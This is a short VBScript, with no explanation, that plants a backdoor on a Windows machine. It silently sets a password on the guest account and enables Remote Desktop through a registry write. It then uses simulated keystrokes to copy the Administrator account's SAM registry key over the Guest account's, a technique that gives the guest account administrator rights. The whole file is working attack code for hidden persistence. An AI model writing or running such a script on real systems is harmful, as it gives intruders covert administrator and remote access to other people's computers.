Set WshShell=CreateObject("Wscript.Shell")

WshShell.run "cmd.exe /c net user guest hacden",0
opentemi = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" 
WshShell.RegWrite opentemi&"fDenyTSConnections",0,"REG_DWORD" 

WshShell.sendkeys "reg copy ""HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4"" ""HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5"" /s "+("{Enter}")+("Yes")+("{Enter}")+("No")+("{Enter}")
set WshShell = nothing



